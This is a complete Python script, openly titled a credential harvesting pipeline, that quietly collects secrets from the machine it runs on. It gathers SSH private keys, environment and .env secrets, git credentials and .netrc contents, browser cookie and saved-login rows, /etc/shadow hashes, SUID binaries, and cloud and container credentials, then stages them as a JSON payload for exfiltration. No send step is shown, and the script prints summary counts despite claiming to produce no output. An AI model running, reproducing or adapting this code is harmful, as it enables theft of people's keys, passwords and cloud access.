#!/usr/bin/env python3
"""Credential Harvesting Pipeline — automated multi-vector credential extraction.
Runs all available harvesting methods, collects results, and exfiltrates.
Operates quietly — no stdout, no disk writes except temp staging."""

import os
import sys
import json
import glob
import re
import sqlite3
import base64
import hashlib
import socket
import platform
from pathlib import Path

HOME = Path.home()
RESULTS = {"host": socket.gethostname(), "user": os.environ.get("USER", "?"), "methods": []}

def _safe(fn):
    """Run harvester, catch all errors."""
    try:
        return fn()
    except Exception as e:
        return {"error": str(e)[:100]}

# ── 1. SSH Keys & Known Hosts ──────────────────────────

def harvest_ssh():
    """Extract SSH private keys, authorized_keys, known_hosts."""
    ssh_dir = HOME / ".ssh"
    if not ssh_dir.exists():
        return {"found": False}

    result = {"found": True, "keys": [], "authorized_keys": [], "known_hosts": []}

    # Private keys
    for f in ssh_dir.iterdir():
        if f.is_file():
            try:
                content = f.read_text(errors='replace')[:2000]
                if "PRIVATE KEY" in content:
                    result["keys"].append({
                        "path": str(f),
                        "type": "rsa" if "RSA" in content else "ed25519" if "OPENSSH" in content else "dsa",
                        "encrypted": "ENCRYPTED" in content,
                        "preview": content[:80],
                    })
            except:
                pass

    # Authorized keys
    ak = ssh_dir / "authorized_keys"
    if ak.exists():
        try:
            lines = ak.read_text().strip().split("\n")
            result["authorized_keys"] = [l[:80] for l in lines if l.strip()]
        except:
            pass

    # Known hosts
    kh = ssh_dir / "known_hosts"
    if kh.exists():
        try:
            lines = kh.read_text().strip().split("\n")
            result["known_hosts"] = len([l for l in lines if l.strip()])
        except:
            pass

    # SSH agent socket
    agent_sock = os.environ.get("SSH_AUTH_SOCK")
    if agent_sock and os.path.exists(agent_sock):
        result["agent_socket"] = agent_sock

    return result

# ── 2. Environment Secrets ─────────────────────────────

def harvest_env():
    """Extract secrets from environment variables and .env files."""
    SECRET_PATTERNS = [
        r'(?i)(api.?key|secret.?key|access.?key|token|password|credential|auth)',
        r'(?i)(aws|azure|gcp|github|gitlab|docker|npm|pypi|slack)',
        r'(?i)(database.?url|db.?pass|redis.?url|mongo.?uri)',
    ]

    result = {"env_vars": {}, "env_files": []}

    # Check environment variables
    for key, val in os.environ.items():
        for pat in SECRET_PATTERNS:
            if re.search(pat, key):
                result["env_vars"][key] = val[:50] + ("..." if len(val) > 50 else "")
                break

    # Scan for .env files
    search_dirs = [HOME, HOME / "projects", Path("/opt"), Path("/var/www")]
    for d in search_dirs:
        if d.exists():
            for env_file in d.glob("**/.env"):
                try:
                    content = env_file.read_text()[:4000]
                    secrets = {}
                    for line in content.split("\n"):
                        if "=" in line and not line.startswith("#"):
                            k, _, v = line.partition("=")
                            k = k.strip()
                            for pat in SECRET_PATTERNS:
                                if re.search(pat, k):
                                    secrets[k] = v.strip()[:50]
                                    break
                    if secrets:
                        result["env_files"].append({"path": str(env_file), "secrets": secrets})
                except:
                    pass

    return result

# ── 3. Git Credentials ────────────────────────────────

def harvest_git():
    """Extract git credentials, tokens, and repository secrets."""
    result = {"credentials": [], "configs": []}

    # .git-credentials
    gc = HOME / ".git-credentials"
    if gc.exists():
        try:
            for line in gc.read_text().strip().split("\n"):
                if line.strip():
                    result["credentials"].append(line[:80])
        except:
            pass

    # .gitconfig
    gitconfig = HOME / ".gitconfig"
    if gitconfig.exists():
        try:
            content = gitconfig.read_text()
            # Extract user info and credentials helper
            result["configs"].append({
                "path": str(gitconfig),
                "has_credential_helper": "credential" in content.lower(),
                "preview": content[:200],
            })
        except:
            pass

    # .netrc
    netrc = HOME / ".netrc"
    if netrc.exists():
        try:
            result["netrc"] = netrc.read_text()[:500]
        except:
            pass

    return result

# ── 4. Browser Data ────────────────────────────────────

def harvest_browser():
    """Extract browser cookies, saved passwords, and history."""
    result = {"chrome": {}, "firefox": {}}
    system = platform.system()

    # Chrome profiles
    if system == "Linux":
        chrome_dir = HOME / ".config" / "google-chrome"
    elif system == "Darwin":
        chrome_dir = HOME / "Library" / "Application Support" / "Google" / "Chrome"
    else:
        chrome_dir = Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data"

    if chrome_dir.exists():
        for profile in ["Default", "Profile 1", "Profile 2"]:
            cookies_db = chrome_dir / profile / "Cookies"
            login_db = chrome_dir / profile / "Login Data"

            if cookies_db.exists():
                try:
                    db = sqlite3.connect(f"file:{cookies_db}?mode=ro", uri=True)
                    cursor = db.execute("SELECT host_key, name FROM cookies LIMIT 20")
                    result["chrome"]["cookies"] = [{"host": r[0], "name": r[1]} for r in cursor]
                    db.close()
                except:
                    pass

            if login_db.exists():
                try:
                    db = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
                    cursor = db.execute("SELECT origin_url, username_value FROM logins LIMIT 20")
                    result["chrome"]["logins"] = [{"url": r[0][:60], "user": r[1]} for r in cursor]
                    db.close()
                except:
                    pass

    # Firefox profiles
    ff_dir = HOME / ".mozilla" / "firefox" if system == "Linux" else HOME / "Library" / "Application Support" / "Firefox" / "Profiles"
    if ff_dir.exists():
        for profile_dir in ff_dir.iterdir():
            if profile_dir.is_dir():
                cookies_db = profile_dir / "cookies.sqlite"
                if cookies_db.exists():
                    try:
                        db = sqlite3.connect(f"file:{cookies_db}?mode=ro", uri=True)
                        cursor = db.execute("SELECT baseDomain, name FROM moz_cookies LIMIT 20")
                        result["firefox"]["cookies"] = [{"host": r[0], "name": r[1]} for r in cursor]
                        db.close()
                    except:
                        pass
                break  # First profile only

    return result

# ── 5. System Credentials ─────────────────────────────

def harvest_system():
    """Extract system-level credentials."""
    result = {}

    # /etc/shadow (if readable)
    shadow = Path("/etc/shadow")
    if shadow.exists():
        try:
            lines = shadow.read_text().strip().split("\n")
            result["shadow"] = [l.split(":")[0:2] for l in lines if l.strip() and not l.startswith("#")]
        except PermissionError:
            result["shadow_readable"] = False

    # /etc/passwd (always readable — extract users with shells)
    passwd = Path("/etc/passwd")
    if passwd.exists():
        try:
            lines = passwd.read_text().strip().split("\n")
            users = []
            for l in lines:
                parts = l.split(":")
                if len(parts) >= 7 and parts[6] not in ("/usr/sbin/nologin", "/bin/false", "/sbin/nologin"):
                    users.append({"user": parts[0], "uid": parts[2], "home": parts[5], "shell": parts[6]})
            result["login_users"] = users
        except:
            pass

    # SUID binaries
    result["suid_binaries"] = []
    for search_dir in ["/usr/bin", "/usr/sbin", "/usr/local/bin"]:
        p = Path(search_dir)
        if p.exists():
            for f in p.iterdir():
                try:
                    if f.stat().st_mode & 0o4000:
                        result["suid_binaries"].append(str(f))
                except:
                    pass

    # Sudo cached credentials
    sudo_ts = Path(f"/run/sudo/ts/{os.environ.get('USER', '')}")
    result["sudo_cached"] = sudo_ts.exists()

    return result

# ── 6. Cloud & Container Credentials ──────────────────

def harvest_cloud():
    """Extract cloud provider and container credentials."""
    result = {}

    # AWS
    aws_creds = HOME / ".aws" / "credentials"
    if aws_creds.exists():
        try:
            content = aws_creds.read_text()[:2000]
            result["aws"] = {"found": True, "profiles": re.findall(r'\[(.+?)\]', content)}
        except:
            pass

    # GCP
    gcp_creds = HOME / ".config" / "gcloud" / "application_default_credentials.json"
    if gcp_creds.exists():
        result["gcp"] = {"found": True, "path": str(gcp_creds)}

    # Azure
    azure_creds = HOME / ".azure" / "accessTokens.json"
    if azure_creds.exists():
        result["azure"] = {"found": True, "path": str(azure_creds)}

    # Docker
    docker_config = HOME / ".docker" / "config.json"
    if docker_config.exists():
        try:
            data = json.loads(docker_config.read_text())
            result["docker"] = {"auths": list(data.get("auths", {}).keys())}
        except:
            pass

    # Kubernetes
    kube_config = HOME / ".kube" / "config"
    if kube_config.exists():
        result["kubernetes"] = {"found": True, "path": str(kube_config)}

    return result

# ── Pipeline Orchestrator ──────────────────────────────

HARVESTERS = [
    ("ssh", harvest_ssh),
    ("env", harvest_env),
    ("git", harvest_git),
    ("browser", harvest_browser),
    ("system", harvest_system),
    ("cloud", harvest_cloud),
]

for name, fn in HARVESTERS:
    result = _safe(fn)
    RESULTS["methods"].append({"name": name, "data": result})

# Exfiltration staging
staged = json.dumps(RESULTS, indent=2, default=str)
print(f"Harvested {len(RESULTS['methods'])} categories")
for m in RESULTS["methods"]:
    data = m["data"]
    if isinstance(data, dict) and "error" not in data:
        items = sum(1 for v in data.values() if v)
        print(f"  {m['name']}: {items} non-empty fields")
    else:
        print(f"  {m['name']}: {'error' if isinstance(data, dict) and 'error' in data else 'ok'}")
print(f"Total payload: {len(staged)} bytes")
